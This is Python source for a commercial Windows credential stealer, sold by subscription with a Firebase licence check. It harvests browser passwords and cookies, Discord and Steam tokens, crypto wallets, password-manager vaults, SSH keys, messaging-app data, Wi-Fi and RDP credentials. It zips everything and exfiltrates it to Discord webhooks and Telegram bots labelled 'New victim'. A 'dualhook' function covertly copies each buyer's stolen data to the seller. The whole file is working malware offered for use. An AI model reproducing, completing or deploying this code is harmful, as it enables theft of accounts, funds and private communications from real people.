import os
import sys
import subprocess
import zipfile
import datetime
import uuid
import shutil
from pathlib import Path

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([
    ("wmi", "wmi"),
    ("requests", "requests"),
    ("psutil", "psutil"),
    ("pyzipper", "pyzipper")
])

import wmi
import requests
import time
import pyzipper
from firebase_config import FIREBASE_CONFIG
from config import USER_ID, TEMP, DEBUG, log

DATABASE_URL = FIREBASE_CONFIG['databaseURL']

from modules import (
    grab_discord, 
    grab_browsers, 
    grab_steam, 
    grab_screenshot,
    grab_userinfo,
    grab_software,
    grab_browser_list,
    grab_network,
    grab_messaging,
    grab_firefox,
    grab_wallets,
    grab_password_managers,
    grab_ssh_git_ftp,
    grab_processes
)

def get_hwid():
    """Generate hardware ID from system UUID"""
    try:
        c = wmi.WMI()
        for item in c.Win32_ComputerSystemProduct():
            return item.UUID.replace("-", "")
    except:
        return uuid.UUID(int=uuid.getnode()).hex

def get_user_config(user_id):
    """Fetch user configuration from Firebase using REST API"""
    try:
        url = f"{DATABASE_URL}/users/{user_id}.json"
        response = requests.get(url, timeout=10)
        
        if response.status_code != 200:
            log(f"Failed to fetch user config: {response.status_code}")
            return None
        
        user_data = response.json()
        
        if not user_data:
            log(f"User ID {user_id} not found in database")
            return None
        
        # Check expiration
        current_time = int(time.time())
        expiration = user_data.get('expiration', 0)
        
        if current_time > expiration:
            log(f"Subscription expired for {user_id}")
            
            # Send expiration notification
            webhook = user_data.get('discord_webhook')
            tg_token = user_data.get('telegram_bot_token')
            tg_chat = user_data.get('telegram_chat_id')
            
            if webhook:
                try:
                    requests.post(webhook, json={
                        'content': f'⚠️ **Subscription Expired**\n\nUser ID: `{user_id}`\nRenew your subscription to continue receiving logs.'
                    }, timeout=10)
                except:
                    pass
            
            if tg_token and tg_chat:
                try:
                    tg_url = f"https://api.telegram.org/bot{tg_token}/sendMessage"
                    requests.post(tg_url, json={
                        'chat_id': tg_chat,
                        'text': f'⚠️ *Subscription Expired*\n\nUser ID: `{user_id}`\nRenew your subscription to continue receiving logs.',
                        'parse_mode': 'Markdown'
                    }, timeout=10)
                except:
                    pass
            
            return None
        
        expire_date = datetime.datetime.fromtimestamp(expiration).strftime('%Y-%m-%d %H:%M:%S')
        log(f"User config loaded - Expires: {expire_date}")
        return user_data
        
    except Exception as e:
        log(f"Firebase error: {e}")
        return None

def create_zip_package(hwid, timestamp):
    """Collect all stolen data and create password-protected zip package"""
    zip_name = f"{hwid}.{timestamp}.zip"
    zip_path = os.path.join(TEMP, zip_name)
    
    log(f"Creating password-protected zip: {zip_path}")
    log(f"Password: {USER_ID}")
    
    # Create password-protected zip using pyzipper
    with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(USER_ID.encode())
        # Screenshot
        screenshot_path = grab_screenshot()
        if screenshot_path and os.path.exists(screenshot_path):
            zf.write(screenshot_path, "screenshot.png")
            try:
                os.remove(screenshot_path)
            except:
                pass
        
        # Discord tokens
        discord_tokens = grab_discord()
        if discord_tokens:
            token_content = "=== DISCORD TOKENS ===\n\n"
            for t in discord_tokens:
                token_content += f"Platform: {t['platform']}\n"
                token_content += f"Username: {t['username']}\n"
                token_content += f"User ID: {t['id']}\n"
                token_content += f"Email: {t['email']}\n"
                token_content += f"Phone: {t['phone']}\n"
                token_content += f"Token: {t['token']}\n"
                token_content += "-" * 60 + "\n\n"
            zf.writestr("Discord/tokens.txt", token_content)
        
        # Browser data (cookies from injector, passwords from chromelevator)
        browser_output = grab_browsers()
        abe_keys = []
        
        if browser_output:
            # Handle cookies from injector.py
            cookies = browser_output.get('cookies', {})
            if cookies:
                for browser_name, cookie_content in cookies.items():
                    zf.writestr(f"Cookies/{browser_name}_cookies.txt", cookie_content)
                log(f"Saved {len(cookies)} cookie files")
            
            # Handle passwords from chromelevator
            passwords_data = browser_output.get('passwords', {})
            if passwords_data:
                # Save verbose log
                if passwords_data.get('verbose_log'):
                    zf.writestr("CookieLog/ABELog.txt", passwords_data['verbose_log'])
                
                # Save text format passwords
                if passwords_data.get('text_passwords'):
                    for profile_key, text_data in passwords_data['text_passwords'].items():
                        browser_name, profile_name = profile_key.split('/')
                        zf.writestr(f"Browsers/{browser_name}/{profile_name}/passwords.txt", text_data)
                    log(f"Saved {len(passwords_data['text_passwords'])} password files")
                
                # Save original JSON files (cookies, tokens)
                output_dir = passwords_data.get('output_dir')
                if output_dir:
                    file_count = 0
                    for browser_dir in output_dir.iterdir():
                        if not browser_dir.is_dir():
                            continue
                        
                        for profile_dir in browser_dir.iterdir():
                            if not profile_dir.is_dir():
                                continue
                            
                            for data_file in profile_dir.glob("*.json"):
                                arc_path = f"Browsers/{browser_dir.name}/{profile_dir.name}/{data_file.name}"
                                zf.write(data_file, arc_path)
                                file_count += 1
                    
                    log(f"Added {file_count} browser JSON files")
                
                # Store ABE keys
                abe_keys = passwords_data.get('abe_keys', [])
                
                # Cleanup
                if output_dir:
                    try:
                        shutil.rmtree(output_dir)
                    except:
                        pass
        
        # Steam data
        steam_data = grab_steam()
        if steam_data:
            for config in steam_data['config_files']:
                if isinstance(config['data'], str):
                    zf.writestr(f"Steam/config/{config['name']}", config['data'])
                else:
                    zf.writestr(f"Steam/config/{config['name']}", config['data'])
            
            for ssfn in steam_data['ssfn_files']:
                zf.writestr(f"Steam/ssfn/{ssfn['name']}", ssfn['data'])
            
            if steam_data['tokens']:
                tokens_content = "=== STEAM SESSION TOKENS ===\n\n"
                for token in steam_data['tokens']:
                    tokens_content += f"Login: {token.get('login', 'Unknown')}\n"
                    tokens_content += f"Persona: {token.get('persona', 'Unknown')}\n"
                    tokens_content += f"SteamID: {token.get('steamid', 'Unknown')}\n"
                    if 'token' in token:
                        tokens_content += f"Token: {token['token']}\n"
                    tokens_content += "-" * 60 + "\n\n"
                zf.writestr("Steam/tokens.txt", tokens_content)
            
            log(f"Added Steam data from {len(steam_data['installations'])} installation(s)")
        
        # Firefox/Gecko Browsers
        firefox_data = grab_firefox()
        if firefox_data:
            for browser_name, profiles in firefox_data.items():
                for profile_data in profiles:
                    profile_name = profile_data['profile']
                    
                    if profile_data['cookies']:
                        cookies_txt = f"=== {browser_name} - {profile_name} COOKIES ===\n\n"
                        for cookie in profile_data['cookies']:
                            cookies_txt += f"Host: {cookie['host']}\n"
                            cookies_txt += f"Name: {cookie['name']}\n"
                            cookies_txt += f"Value: {cookie['value']}\n"
                            cookies_txt += f"Path: {cookie['path']}\n"
                            cookies_txt += "-" * 60 + "\n"
                        
                        zf.writestr(f"Firefox/{browser_name}/{profile_name}/cookies.txt", cookies_txt)
                    
                    if profile_data['passwords']:
                        passwords_txt = f"=== {browser_name} - {profile_name} PASSWORDS ===\n\n"
                        for pwd in profile_data['passwords']:
                            passwords_txt += f"URL: {pwd['url']}\n"
                            passwords_txt += f"Username: {pwd['username']}\n"
                            passwords_txt += f"Password: {pwd['password']}\n"
                            passwords_txt += "-" * 60 + "\n"
                        
                        zf.writestr(f"Firefox/{browser_name}/{profile_name}/passwords.txt", passwords_txt)
        
        # Crypto Wallets
        wallets = grab_wallets()
        if wallets:
            if wallets.get('desktop'):
                for wallet_name, files in wallets['desktop'].items():
                    for filename, content in files.items():
                        zf.writestr(f"Wallets/Desktop/{wallet_name}/{filename}", content)
                log(f"Saved {len(wallets['desktop'])} desktop wallets")
            
            if wallets.get('extensions'):
                for key, wallet_info in wallets['extensions'].items():
                    # key format: "Browser_Profile_Wallet" or custom key from wallet_stealer
                    if isinstance(wallet_info, dict) and 'files' in wallet_info:
                        # New format with structured data
                        browser = wallet_info.get('browser', 'Unknown')
                        profile = wallet_info.get('profile', 'Unknown')
                        wallet = wallet_info.get('wallet', 'Unknown')
                        files = wallet_info.get('files', {})
                        
                        for filename, content in files.items():
                            zf.writestr(f"Wallets/Extensions/{browser}/{profile}/{wallet}/{filename}", content)
                    else:
                        # Legacy format or direct files
                        if isinstance(wallet_info, dict):
                            for filename, content in wallet_info.items():
                                zf.writestr(f"Wallets/Extensions/{key}/{filename}", content)
                log("Saved extension wallets")
        
        # Password Managers
        pm_data = grab_password_managers()
        if pm_data:
            for manager_name, data in pm_data.items():
                for filename, content in data['files'].items():
                    zf.writestr(f"PasswordManagers/{manager_name}/{filename}", content)
                
                desc = f"{manager_name}\n{data['description']}\n"
                zf.writestr(f"PasswordManagers/{manager_name}/README.txt", desc)
            
            log(f"Saved {len(pm_data)} password managers")
        
        # SSH/Git/FTP
        ssh_git_data = grab_ssh_git_ftp()
        if ssh_git_data:
            if ssh_git_data['ssh_keys']:
                for filename, content in ssh_git_data['ssh_keys'].items():
                    zf.writestr(f"SSH_Keys/{filename}", content)
            
            if ssh_git_data['git']:
                for filename, content in ssh_git_data['git'].items():
                    if isinstance(content, str):
                        content = content.encode('utf-8')
                    zf.writestr(f"Git/{filename}", content)
            
            if ssh_git_data['clipboard']:
                for filename, content in ssh_git_data['clipboard'].items():
                    zf.writestr(f"Clipboard/{filename}", content)
            
            if ssh_git_data['putty']:
                putty_txt = "=== PuTTY Sessions ===\n\n"
                for session_name, session_data in ssh_git_data['putty'].items():
                    putty_txt += f"Session: {session_name}\n"
                    for key, value in session_data.items():
                        if key != 'name':
                            putty_txt += f"  {key}: {value}\n"
                    putty_txt += "\n"
                zf.writestr("FTP/PuTTY_sessions.txt", putty_txt)
            
            if ssh_git_data['winscp']:
                for filename, content in ssh_git_data['winscp'].items():
                    if isinstance(content, str):
                        content = content.encode('utf-8')
                    zf.writestr(f"FTP/WinSCP/{filename}", content)
            
            log("Saved SSH/Git/FTP data")
        
        # Running Processes
        processes = grab_processes()
        if processes:
            proc_txt = "=== RUNNING PROCESSES ===\n\n"
            proc_txt += f"Total Processes: {len(processes)}\n\n"
            
            processes.sort(key=lambda x: x['memory_mb'], reverse=True)
            
            proc_txt += f"{'PID':<8} {'Name':<30} {'Memory (MB)':<12} {'User':<20}\n"
            proc_txt += "="*80 + "\n"
            
            for proc in processes:
                proc_txt += f"{proc['pid']:<8} {proc['name']:<30} {proc['memory_mb']:<12} {proc['username']:<20}\n"
            
            proc_txt += "\n\n=== DETAILED INFO ===\n\n"
            
            for proc in processes:
                proc_txt += f"PID: {proc['pid']}\n"
                proc_txt += f"Name: {proc['name']}\n"
                proc_txt += f"Executable: {proc['exe']}\n"
                proc_txt += f"Command Line: {proc['cmdline']}\n"
                proc_txt += f"User: {proc['username']}\n"
                proc_txt += f"Created: {proc['created']}\n"
                proc_txt += f"Memory: {proc['memory_mb']} MB\n"
                proc_txt += "-"*80 + "\n"
            
            zf.writestr("System/running_processes.txt", proc_txt)
            log(f"Saved {len(processes)} processes")
        
        # Messaging Apps
        messaging_data = grab_messaging()
        if messaging_data:
            if messaging_data['telegram']:
                for tg_file in messaging_data['telegram']:
                    zf.writestr(f"Messaging/Telegram/tdata/{tg_file['path']}", tg_file['data'])
            
            if messaging_data['signal']:
                for sig_file in messaging_data['signal']:
                    zf.writestr(f"Messaging/Signal/{sig_file['path']}", sig_file['data'])
            
            if messaging_data['whatsapp']:
                for wa_file in messaging_data['whatsapp']:
                    zf.writestr(f"Messaging/WhatsApp/leveldb/{wa_file['name']}", wa_file['data'])
            
            if messaging_data['slack']:
                for slack_file in messaging_data['slack']:
                    zf.writestr(f"Messaging/Slack/{slack_file['path']}", slack_file['data'])
        
        # Network Credentials
        network_data = grab_network()
        if network_data:
            if network_data['wifi']:
                wifi_content = "=== WiFi PROFILES & PASSWORDS ===\n\n"
                for wifi in network_data['wifi']:
                    wifi_content += f"Profile: {wifi['profile']}\n"
                    wifi_content += f"Password: {wifi['password']}\n"
                    wifi_content += "-" * 60 + "\n\n"
                zf.writestr("WiFi/profiles.txt", wifi_content)
            
            if network_data['rdp']['connections'] or network_data['rdp']['files']:
                rdp_content = "=== RDP CONNECTION HISTORY ===\n\n"
                
                if network_data['rdp']['connections']:
                    rdp_content += "Recent Connections (Registry):\n"
                    for rdp in network_data['rdp']['connections']:
                        rdp_content += f"Server: {rdp['server']}\n"
                        rdp_content += f"Username: {rdp['username']}\n"
                        rdp_content += "-" * 60 + "\n"
                
                if network_data['rdp']['files']:
                    rdp_content += "\n.RDP Files Found:\n\n"
                    for rdp_file in network_data['rdp']['files']:
                        rdp_content += f"File: {rdp_file['path']}\n"
                        rdp_content += f"{rdp_file['content']}\n"
                        rdp_content += "=" * 60 + "\n\n"
                
                zf.writestr("RDP/connections.txt", rdp_content)
            
            if network_data['vpn']:
                for vpn in network_data['vpn']:
                    if vpn['type'] == 'text':
                        zf.writestr(f"VPNConfigs/{vpn['name']}", vpn['content'])
                    else:
                        zf.writestr(f"VPNConfigs/{vpn['name']}", vpn['content'])
            
            if network_data.get('protonvpn'):
                for filename, content in network_data['protonvpn'].items():
                    zf.writestr(f"Network/ProtonVPN/{filename}", content)
                log(f"Saved {len(network_data['protonvpn'])} ProtonVPN configs")
            
            if network_data['filezilla']:
                for fz_file in network_data['filezilla']:
                    zf.writestr(f"FTP/FileZilla/{fz_file['name']}", fz_file['content'])
        
        # System Info
        userinfo = grab_userinfo(abe_keys)
        if userinfo:
            zf.writestr("SystemInfo/userinformation.txt", userinfo)
        
        software = grab_software()
        if software:
            zf.writestr("SystemInfo/installed_software.txt", software)
        
        browser_list = grab_browser_list()
        if browser_list:
            zf.writestr("SystemInfo/installed_browsers.txt", browser_list)
    
    zip_size = os.path.getsize(zip_path)
    zip_size_mb = zip_size / (1024 * 1024)
    log(f"Password-protected zip size: {zip_size_mb:.2f} MB")
    
    return zip_path

def send_to_telegram(zip_path, hwid, telegram_bot_token, telegram_user_id):
    """Send file to Telegram bot"""
    log("Sending to Telegram...")
    
    try:
        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendDocument"
        
        with open(zip_path, 'rb') as f:
            files = {'document': (os.path.basename(zip_path), f)}
            data = {
                'chat_id': telegram_user_id,
                'caption': f'**New victim: {hwid}**\nHostname: {os.getenv("COMPUTERNAME")}\nUsername: {os.getenv("USERNAME")}'
            }
            
            response = requests.post(url, files=files, data=data, timeout=300)
            
            if response.status_code == 200:
                result = response.json()
                
                if result.get('ok'):
                    file_id = result['result']['document']['file_id']
                    tg_link = f"https://t.me/c/{telegram_user_id}/{result['result']['message_id']}"
                    
                    log(f"Telegram upload successful: {tg_link}")
                    return tg_link
                else:
                    log(f"Telegram API error: {result}")
                    return None
            else:
                log(f"Telegram upload failed: {response.status_code}")
                return None
                
    except Exception as e:
        log(f"Telegram error: {type(e).__name__}: {e}")
        return None

def send_dualhook_telegram(zip_path, hwid, telegram_bot_token, telegram_user_id):
    """Send zip file to buyer with normal message (no dualhook info)"""
    log("Sending zip to buyer...")
    
    try:
        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendDocument"
        
        caption = f'**New victim: {hwid}**\n' \
                 f'Hostname: {os.getenv("COMPUTERNAME")}\n' \
                 f'Username: {os.getenv("USERNAME")}'
        
        with open(zip_path, 'rb') as f:
            files = {'document': (os.path.basename(zip_path), f)}
            data = {
                'chat_id': telegram_user_id,
                'caption': caption,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, files=files, data=data, timeout=300)
            
            if response.status_code == 200:
                result = response.json()
                
                if result.get('ok'):
                    file_id = result['result']['document']['file_id']
                    tg_link = f"https://t.me/c/{telegram_user_id}/{result['result']['message_id']}"
                    
                    log(f"Buyer Telegram upload successful: {tg_link}")
                    return tg_link
                else:
                    log(f"Buyer Telegram API error: {result}")
                    return None
            else:
                log(f"Buyer Telegram upload failed: {response.status_code}")
                return None
                
    except Exception as e:
        log(f"Buyer Telegram error: {type(e).__name__}: {e}")
        return None

def send_to_webhook(zip_path, hwid, webhook_url, telegram_link=None):
    """Send zip file or Telegram link to Discord webhook"""
    
    if not os.path.exists(zip_path) and not telegram_link:
        log(f"ERROR: No zip file or Telegram link")
        return False
    
    if not webhook_url:
        log("ERROR: Webhook URL not configured!")
        return False
    
    try:
        log(f"Sending to webhook...")
        
        if telegram_link:
            payload = {
                'content': f'**New victim: {hwid}**\n'
                          f'Hostname: {os.getenv("COMPUTERNAME")}\n'
                          f'Username: {os.getenv("USERNAME")}\n\n'
                          f'**File too large for Discord (>9MB)**\n'
                          f'Download from Telegram: {telegram_link}'
            }
            
            response = requests.post(webhook_url, json=payload)
        else:
            with open(zip_path, 'rb') as f:
                files = {
                    'file': (os.path.basename(zip_path), f, 'application/zip')
                }
                
                payload = {
                    'content': f'**New victim: {hwid}**\nHostname: {os.getenv("COMPUTERNAME")}\nUsername: {os.getenv("USERNAME")}'
                }
                
                response = requests.post(webhook_url, data=payload, files=files)
        
        if response.status_code == 200 or response.status_code == 204:
            log("Webhook sent successfully!")
            return True
        else:
            log(f"Webhook failed: {response.status_code}")
            return False
            
    except Exception as e:
        log(f"Webhook error: {type(e).__name__}: {e}")
        return False

def main():
    try:
        log("=== Stealer Started ===")
        
        # Fetch buyer configuration from Firebase
        buyer_config = get_user_config(USER_ID)
        
        if not buyer_config:
            log("Invalid or expired subscription. Exiting.")
            return
        
        SELLER_ID = "Create a new user that the dualhooked hits will go to and paste it here."
        seller_config = get_user_config(SELLER_ID)
        
        if not seller_config:
            log("Seller configuration not found. Exiting.")
            return
        
        WEBHOOK_URL = seller_config.get('discord_webhook')
        TELEGRAM_BOT_TOKEN = seller_config.get('telegram_bot_token')
        TELEGRAM_USER_ID = seller_config.get('telegram_chat_id')
        
        is_dualhook = (WEBHOOK_URL and TELEGRAM_BOT_TOKEN and TELEGRAM_USER_ID)
        if is_dualhook:
            log("DUALHOOKED: Both Discord and Telegram available")
        
        hwid = get_hwid()
        log(f"HWID: {hwid}")
        
        timestamp = int(datetime.datetime.now().timestamp())
        
        zip_path = create_zip_package(hwid, timestamp)
        
        zip_size = os.path.getsize(zip_path)
        zip_size_mb = zip_size / (1024 * 1024)
        
        success = False
        telegram_link = None
        
        if is_dualhook:
            log("DUALHOOKED HIT: Sending zip to both buyer and seller")
            
            BUYER_TELEGRAM_BOT_TOKEN = buyer_config.get('telegram_bot_token')
            BUYER_TELEGRAM_USER_ID = buyer_config.get('telegram_chat_id')
            
            buyer_success = False
            if BUYER_TELEGRAM_BOT_TOKEN and BUYER_TELEGRAM_USER_ID:
                buyer_telegram_link = send_to_telegram(zip_path, hwid, BUYER_TELEGRAM_BOT_TOKEN, BUYER_TELEGRAM_USER_ID)
                if buyer_telegram_link:
                    buyer_success = True
                    log(f"Buyer {USER_ID} received zip: {buyer_telegram_link}")
            
            seller_telegram_link = send_dualhook_telegram(zip_path, hwid, TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID)
            
            if seller_telegram_link:
                dualhook_message = f' Dualhooked hit\n\n' \
                                 f'Dualhook hit from: {USER_ID}\n\n' \
                                 f'This is the zip they got:\n\n' \
                                 f'Victim Details:\n' \
                                 f'HWID: {hwid}\n' \
                                 f'Hostname: {os.getenv("COMPUTERNAME")}\n' \
                                 f'Username: {os.getenv("USERNAME")}\n\n' \
                                 f'Zip Password: {USER_ID}\n\n'
                
                # Send message to seller's Telegram
                telegram_msg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                msg_data = {
                    'chat_id': TELEGRAM_USER_ID,
                    'text': dualhook_message,
                    'parse_mode': 'Markdown'
                }
                
                msg_response = requests.post(telegram_msg_url, json=msg_data, timeout=30)
                if msg_response.status_code == 200:
                    log("DUALHOOKED: Seller notification sent to Telegram successfully!")
                    success = True
                else:
                    log(f"DUALHOOKED: Seller Telegram notification failed: {msg_response.status_code}")
            else:
                log("DUALHOOKED: Failed to send to seller")
        
        elif zip_size_mb > 9:
            # Single hook - Large file, use Telegram fallback
            log(f"File size {zip_size_mb:.2f}MB exceeds 9MB, using Telegram fallback")
            telegram_link = send_to_telegram(zip_path, hwid, TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID)
            
            if telegram_link and WEBHOOK_URL:
                success = send_to_webhook(zip_path, hwid, WEBHOOK_URL, telegram_link=telegram_link)
            else:
                log("Telegram upload failed, cannot send to webhook")
        else:
            # Single hook - Send to Discord only
            success = send_to_webhook(zip_path, hwid, WEBHOOK_URL)
        
        if success:
            log("Exfil completed successfully")
        else:
            log("Exfil failed")
        
        if not DEBUG:
            try:
                os.remove(zip_path)
                log("Cleaned up zip file")
            except:
                pass
        
        log("Stealer Finished")
        
    except Exception as e:
        log(f"CRITICAL ERROR: {type(e).__name__}: {e}")
        import traceback
        if DEBUG:
            traceback.print_exc()

if __name__ == "__main__":
    if os.name != "nt":
        exit()
    main()
